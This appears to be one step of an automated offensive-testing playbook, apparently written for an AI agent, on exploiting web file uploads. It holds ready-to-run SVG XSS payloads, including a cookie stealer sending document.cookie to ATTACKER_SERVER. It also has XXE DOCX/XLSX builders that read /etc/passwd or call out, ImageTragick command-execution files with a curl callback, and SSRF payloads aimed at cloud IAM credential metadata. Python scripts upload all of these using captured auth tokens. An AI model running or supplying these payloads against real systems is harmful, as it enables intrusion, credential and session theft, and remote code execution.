================================================================================
TASK 75 Â· FILE UPLOAD EXPLOITATION - ADVANCED PAYLOADS
================================================================================
Covers testing_toolkit.txt Phase 9 Step 31 (Part 2)
Exploiting file uploads: SVG XSS, XXE-DOCX, ImageTragick, PDF SSRF

âš ï¸  PREREQUISITE: Complete Task 74 first (upload detection & bypass)

================================================================================
INPUTS
================================================================================
outputs/upload/upload_endpoints.txt        â† Upload endpoints from Task 74
outputs/upload/upload_locations.txt        â† Where files are stored
outputs/upload/extension_bypass_results.txt â† Working bypasses
outputs/nuclei/tech_stack.json             â† Tech detection
outputs/har/accounts/*_auth.json           â† Auth tokens

================================================================================
OUTPUTS
================================================================================
outputs/upload/
â”œâ”€â”€ svg_xss_results.txt             â† SVG XSS payloads that worked
â”œâ”€â”€ xxe_docx_results.txt            â† XXE via DOCX/XLSX
â”œâ”€â”€ imagetragick_results.txt        â† ImageMagick exploitation
â”œâ”€â”€ pdf_ssrf_results.txt            â† PDF SSRF/file read
â”œâ”€â”€ htaccess_upload_results.txt     â† .htaccess override
â”œâ”€â”€ gifar_results.txt               â† GIFAR (GIF+JAR) attacks
â”œâ”€â”€ exif_injection_results.txt      â† EXIF metadata injection
â””â”€â”€ advanced_upload_log.txt         â† Full execution log

================================================================================
ğŸ§  AGENT DECISION FRAMEWORK ğŸ§ 
================================================================================

Choose your attack based on what the server DOES with uploaded files:

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SERVER BEHAVIOR                    â”‚ ATTACK TO TRY                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Displays images in browser         â”‚ SVG XSS, EXIF XSS                     â”‚
â”‚ Processes/resizes images           â”‚ ImageTragick (ImageMagick RCE)        â”‚
â”‚ Parses DOCX/XLSX documents         â”‚ XXE via embedded XML                  â”‚
â”‚ Generates PDFs from input          â”‚ SSRF via <img>, LaTeX injection       â”‚
â”‚ Serves files directly              â”‚ .htaccess upload, web shell           â”‚
â”‚ Imports CSV/Excel data             â”‚ CSV formula injection                 â”‚
â”‚ Archives/extracts ZIP              â”‚ Zip slip path traversal               â”‚
â”‚ Converts images                    â”‚ ImageTragick, Ghostscript RCE         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

================================================================================
PHASE 1: SVG XSS ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ§  WHY SVG FOR XSS?
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SVG files are XML-based images that can contain JavaScript.
If server allows SVG uploads AND serves them as image/svg+xml,
the browser will execute JavaScript inside.

Even if Content-Type is image/svg, modern browsers execute JS!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 SVG XSS Payloads
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# create_svg_payloads.sh

mkdir -p temp/agent1/upload/svg_payloads

# Basic XSS
cat > temp/agent1/upload/svg_payloads/xss_basic.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert('XSS');
  </script>
</svg>
EOF

# Cookie stealer
cat > temp/agent1/upload/svg_payloads/xss_cookie.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    new Image().src="http://ATTACKER_SERVER/steal?cookie="+document.cookie;
  </script>
</svg>
EOF

# OnLoad event
cat > temp/agent1/upload/svg_payloads/xss_onload.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100"/>
</svg>
EOF

# OnMouseOver (requires interaction)
cat > temp/agent1/upload/svg_payloads/xss_mouseover.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" onmouseover="alert('XSS')"/>
</svg>
EOF

# ForeignObject (embed HTML in SVG)
cat > temp/agent1/upload/svg_payloads/xss_foreignobject.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('XSS')</script>
    </body>
  </foreignObject>
</svg>
EOF

# Use element with external reference (SSRF)
cat > temp/agent1/upload/svg_payloads/svg_ssrf.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://ATTACKER_SERVER/external.svg#element"/>
</svg>
EOF

# Animate element XSS
cat > temp/agent1/upload/svg_payloads/xss_animate.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert('XSS')"/>
</svg>
EOF

# Set element XSS
cat > temp/agent1/upload/svg_payloads/xss_set.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="alert('XSS')"/>
</svg>
EOF

# Handler attribute
cat > temp/agent1/upload/svg_payloads/xss_handler.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <handler type="text/javascript">alert('XSS')</handler>
</svg>
EOF

echo "[+] Created SVG XSS payloads in temp/agent1/upload/svg_payloads/"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 SVG XSS Tester
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/usr/bin/env python3
# svg_xss_test.py

"""
Upload SVG files and verify XSS execution
"""

import requests
import os

class SVGXSSTester:
    def __init__(self, upload_url, file_param='file', auth_cookies=None):
        self.upload_url = upload_url
        self.file_param = file_param
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.update(auth_cookies or {})
        self.results = []
    
    def create_svg_payloads(self):
        """Generate SVG XSS payloads"""
        
        payloads = {
            'basic': '''<svg xmlns="http://www.w3.org/2000/svg">
                <script>alert("XSS")</script>
            </svg>''',
            
            'onload': '''<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
                <rect width="100" height="100"/>
            </svg>''',
            
            'foreignobject': '''<svg xmlns="http://www.w3.org/2000/svg">
                <foreignObject>
                    <body xmlns="http://www.w3.org/1999/xhtml">
                        <script>alert("XSS")</script>
                    </body>
                </foreignObject>
            </svg>''',
            
            'animate': '''<svg xmlns="http://www.w3.org/2000/svg">
                <animate onbegin="alert('XSS')"/>
            </svg>''',
            
            'encoded': '''<svg xmlns="http://www.w3.org/2000/svg">
                <script>eval(atob('YWxlcnQoIlhTUyIp'))</script>
            </svg>'''
        }
        
        return payloads
    
    def upload_svg(self, filename, content):
        """Upload SVG file"""
        
        files = {
            self.file_param: (filename, content.encode(), 'image/svg+xml')
        }
        
        try:
            resp = self.session.post(self.upload_url, files=files, timeout=30)
            
            if resp.status_code == 200:
                if 'error' not in resp.text.lower():
                    return True, resp.text
        except:
            pass
        
        return False, None
    
    def verify_xss(self, svg_url):
        """Check if SVG is served with correct Content-Type"""
        
        try:
            resp = self.session.get(svg_url, timeout=30)
            content_type = resp.headers.get('Content-Type', '')
            
            # SVG XSS works if served as:
            # - image/svg+xml
            # - application/xml
            # - text/xml
            # Or even text/html!
            
            xss_content_types = ['image/svg+xml', 'application/xml', 'text/xml', 'text/html']
            
            for ct in xss_content_types:
                if ct in content_type.lower():
                    return True, content_type
            
            return False, content_type
            
        except:
            return False, None
    
    def run_tests(self):
        """Test all SVG payloads"""
        
        payloads = self.create_svg_payloads()
        
        for name, payload in payloads.items():
            filename = f'xss_{name}.svg'
            print(f"[*] Testing: {filename}")
            
            success, response = self.upload_svg(filename, payload)
            
            if success:
                print(f"[+] Upload successful: {filename}")
                
                # Try to extract uploaded file URL from response
                import re
                url_match = re.search(r'(https?://[^\s"\']+\.svg|/[^\s"\']+\.svg)', response or '')
                
                if url_match:
                    svg_url = url_match.group(1)
                    xss_works, content_type = self.verify_xss(svg_url)
                    
                    if xss_works:
                        print(f"[!] SVG XSS CONFIRMED: {svg_url} ({content_type})")
                        self.results.append({
                            'payload': name,
                            'url': svg_url,
                            'content_type': content_type
                        })
        
        return self.results
    
    def save_results(self, output_file):
        with open(output_file, 'w') as f:
            for r in self.results:
                f.write(f"{r['url']}|{r['payload']}|{r['content_type']}\n")

================================================================================
PHASE 2: XXE VIA DOCUMENT UPLOADS (DOCX/XLSX/ODT)
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ§  WHY XXE IN DOCUMENTS?
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
DOCX, XLSX, ODT, PPTX are all ZIP files containing XML.
When server parses these documents, it may process external entities.

Key XML files inside DOCX:
- word/document.xml
- [Content_Types].xml
- _rels/.rels

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Create XXE-DOCX Payload
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# create_xxe_docx.sh

mkdir -p temp/agent1/upload/xxe_docx

# Step 1: Create minimal DOCX structure
mkdir -p temp/agent1/upload/xxe_docx/docx_template/word/_rels
mkdir -p temp/agent1/upload/xxe_docx/docx_template/_rels

# [Content_Types].xml with XXE
cat > temp/agent1/upload/xxe_docx/docx_template/\[Content_Types\].xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/payload" ContentType="&xxe;"/>
</Types>
EOF

# word/document.xml (minimal)
cat > temp/agent1/upload/xxe_docx/docx_template/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Test Document</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
EOF

# _rels/.rels
cat > temp/agent1/upload/xxe_docx/docx_template/_rels/.rels << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
EOF

# word/_rels/document.xml.rels
cat > temp/agent1/upload/xxe_docx/docx_template/word/_rels/document.xml.rels << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>
EOF

# Package as DOCX
cd temp/agent1/upload/xxe_docx/docx_template
zip -r ../xxe_payload.docx *
cd -

echo "[+] Created temp/agent1/upload/xxe_docx/xxe_payload.docx"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Create XXE-XLSX Payload
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# create_xxe_xlsx.sh

mkdir -p temp/agent1/upload/xxe_xlsx

# XLSX structure
mkdir -p temp/agent1/upload/xxe_xlsx/xlsx_template/xl/worksheets
mkdir -p temp/agent1/upload/xxe_xlsx/xlsx_template/_rels

# [Content_Types].xml with XXE
cat > temp/agent1/upload/xxe_xlsx/xlsx_template/\[Content_Types\].xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ATTACKER_SERVER/xxe?file=xlsx">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xxe" ContentType="&xxe;"/>
</Types>
EOF

# xl/workbook.xml
cat > temp/agent1/upload/xxe_xlsx/xlsx_template/xl/workbook.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
  </sheets>
</workbook>
EOF

# xl/worksheets/sheet1.xml with XXE in cell
cat > temp/agent1/upload/xxe_xlsx/xlsx_template/xl/worksheets/sheet1.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="str">
        <v>&xxe;</v>
      </c>
    </row>
  </sheetData>
</worksheet>
EOF

# Package
cd temp/agent1/upload/xxe_xlsx/xlsx_template
zip -r ../xxe_payload.xlsx *
cd -

echo "[+] Created temp/agent1/upload/xxe_xlsx/xxe_payload.xlsx"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 oxml_xxe Tool
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# oxml_xxe_usage.sh

# Install oxml_xxe
# git clone https://github.com/BuffaloWill/oxml_xxe.git
# cd oxml_xxe && bundle install

# Create XXE payload DOCX
ruby oxml_xxe.rb \
    --file xxe.docx \
    --payload "file:///etc/passwd" \
    --mode file

# Create OOB XXE payload
ruby oxml_xxe.rb \
    --file xxe_oob.docx \
    --payload "http://ATTACKER/xxe" \
    --mode http

# Create XXE with DTD exfil
ruby oxml_xxe.rb \
    --file xxe_dtd.docx \
    --payload "http://ATTACKER/evil.dtd" \
    --mode dtd

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.4 XXE Document Upload Tester
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/usr/bin/env python3
# xxe_doc_upload.py

"""
Test XXE via document upload (DOCX, XLSX, ODT)
"""

import requests
import zipfile
import io
import os

class XXEDocumentTester:
    def __init__(self, upload_url, file_param='file', oob_server=None, auth_cookies=None):
        self.upload_url = upload_url
        self.file_param = file_param
        self.oob_server = oob_server
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.update(auth_cookies or {})
        self.results = []
    
    def create_xxe_docx(self, payload):
        """Create DOCX with XXE payload"""
        
        content_types = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{payload}">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <foo>&xxe;</foo>
</Types>'''

        document_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>Test</w:t></w:r></w:p></w:body>
</w:document>'''

        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

        doc_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>'''
        
        # Create ZIP in memory
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', content_types)
            zf.writestr('_rels/.rels', rels)
            zf.writestr('word/document.xml', document_xml)
            zf.writestr('word/_rels/document.xml.rels', doc_rels)
        
        return buffer.getvalue()
    
    def test_xxe(self, filename, content, mime_type):
        """Upload document and check for XXE"""
        
        files = {
            self.file_param: (filename, content, mime_type)
        }
        
        try:
            resp = self.session.post(self.upload_url, files=files, timeout=30)
            
            # Check for XXE indicators in response
            if 'root:' in resp.text:  # /etc/passwd content
                return True, 'file_read', resp.text
            elif resp.status_code == 200:
                return True, 'uploaded', resp.text
                
        except Exception as e:
            pass
        
        return False, 'failed', None
    
    def run_tests(self):
        """Test XXE via various document types"""
        
        # Test payloads
        payloads = [
            ('file:///etc/passwd', 'file_read'),
            (f'http://{self.oob_server}/xxe', 'oob') if self.oob_server else None,
            ('file:///c:/windows/win.ini', 'file_read_windows'),
        ]
        
        payloads = [p for p in payloads if p]
        
        for payload, payload_type in payloads:
            # Test DOCX
            docx_content = self.create_xxe_docx(payload)
            success, result_type, response = self.test_xxe(
                'xxe.docx', docx_content, 
                'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
            )
            
            if success:
                print(f"[+] XXE via DOCX: {payload_type} - {result_type}")
                self.results.append({
                    'file_type': 'docx',
                    'payload': payload,
                    'result': result_type
                })
        
        return self.results

================================================================================
PHASE 3: IMAGETRAGICK (CVE-2016-3714)
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ§  WHAT IS IMAGETRAGICK?
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ImageMagick is a popular image processing library.
CVE-2016-3714 allows RCE via specially crafted image files.

Affected operations: convert, identify, display, composite, etc.
Exploited via: MVG, SVG, and other delegate-based formats.

Check if target uses ImageMagick:
- Image resizing on upload
- Thumbnail generation
- Image format conversion
- Image metadata extraction

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 ImageTragick Payloads
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# create_imagetragick.sh

mkdir -p temp/agent1/upload/imagetragick

# Payload 1: MVG format RCE
cat > temp/agent1/upload/imagetragick/rce.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
EOF

# Payload 2: SVG with external reference
cat > temp/agent1/upload/imagetragick/rce.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg&quot;|id > /tmp/pwned&quot;" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# Payload 3: Inline shell execution
cat > temp/agent1/upload/imagetragick/shell.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:|id > /tmp/pwned'
pop graphic-context
EOF

# Payload 4: SSRF via MVG
cat > temp/agent1/upload/imagetragick/ssrf.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
pop graphic-context
EOF

# Payload 5: File read
cat > temp/agent1/upload/imagetragick/fileread.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
EOF

# Payload 6: MSL format
cat > temp/agent1/upload/imagetragick/rce.msl << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="ephemeral:|id > /tmp/pwned"/>
<write filename="/tmp/output.png"/>
</image>
EOF

echo "[+] Created ImageTragick payloads"

# Rename to common image extensions
for ext in jpg png gif; do
    cp temp/agent1/upload/imagetragick/rce.mvg "temp/agent1/upload/imagetragick/rce.${ext}"
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 ImageTragick Tester
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/usr/bin/env python3
# imagetragick_test.py

"""
Test for ImageMagick vulnerabilities (ImageTragick)
"""

import requests

class ImageTragickTester:
    def __init__(self, upload_url, file_param='file', oob_server=None, auth_cookies=None):
        self.upload_url = upload_url
        self.file_param = file_param
        self.oob_server = oob_server
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.update(auth_cookies or {})
        self.results = []
    
    def create_mvg_payload(self, command):
        """Create MVG format payload"""
        return f'''push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|{command}")'
pop graphic-context'''
    
    def create_svg_payload(self, command):
        """Create SVG format payload"""
        return f'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
<image xlink:href="https://example.com/image.jpg&quot;|{command}&quot;" x="0" y="0" height="640px" width="480px" xmlns:xlink="http://www.w3.org/1999/xlink"/>
</svg>'''
    
    def create_msl_payload(self, command):
        """Create MSL format payload"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="ephemeral:|{command}"/>
<write filename="/tmp/output.png"/>
</image>'''
    
    def test_payload(self, filename, content, mime_type='image/jpeg'):
        """Upload payload and check for execution"""
        
        files = {
            self.file_param: (filename, content.encode(), mime_type)
        }
        
        try:
            resp = self.session.post(self.upload_url, files=files, timeout=30)
            return resp.status_code, resp.text
        except:
            return None, None
    
    def run_tests(self):
        """Test all ImageTragick payloads"""
        
        # Use OOB for blind detection
        if self.oob_server:
            oob_cmd = f'curl http://{self.oob_server}/imagetragick'
        else:
            oob_cmd = 'id'
        
        test_cases = [
            ('rce.mvg', self.create_mvg_payload(oob_cmd), 'image/x-mvg'),
            ('rce.svg', self.create_svg_payload(oob_cmd), 'image/svg+xml'),
            ('rce.msl', self.create_msl_payload(oob_cmd), 'application/xml'),
            ('rce.jpg', self.create_mvg_payload(oob_cmd), 'image/jpeg'),  # MVG as JPG
            ('rce.png', self.create_mvg_payload(oob_cmd), 'image/png'),   # MVG as PNG
        ]
        
        for filename, payload, mime in test_cases:
            print(f"[*] Testing: {filename}")
            status, response = self.test_payload(filename, payload, mime)
            
            if status:
                # If OOB server, check logs there
                # Here we just document the upload success
                self.results.append({
                    'filename': filename,
                    'status': status,
                    'mime': mime
                })
                print(f"[+] Uploaded: {filename} (HTTP {status})")
        
        return self.results

================================================================================
PHASE 4: PDF SSRF & FILE READ
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ§  WHY PDF FOR SSRF?
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
PDF generators (wkhtmltopdf, WeasyPrint, PhantomJS) often:
- Render HTML to PDF
- Fetch external resources (<img>, <link>, <iframe>)
- Execute JavaScript

If server converts HTML/input to PDF, try:
- <img src="http://internal/"> for SSRF
- <iframe src="file:///etc/passwd"> for file read
- JavaScript: XMLHttpRequest to internal services

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 PDF SSRF Payloads
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# HTML payloads for PDF generators

# SSRF via img tag
<img src="http://169.254.169.254/latest/meta-data/">

# SSRF via link tag
<link rel="stylesheet" href="http://internal-server/styles.css">

# SSRF via iframe
<iframe src="http://localhost:8080/admin">

# File read via iframe
<iframe src="file:///etc/passwd">

# JavaScript SSRF (if JS is executed)
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
xhr.send();
document.write(xhr.responseText);
</script>

# Redirect SSRF
<meta http-equiv="refresh" content="0;url=http://internal/">

# Object tag
<object data="http://internal/secret">

# Embed tag
<embed src="http://internal/secret">

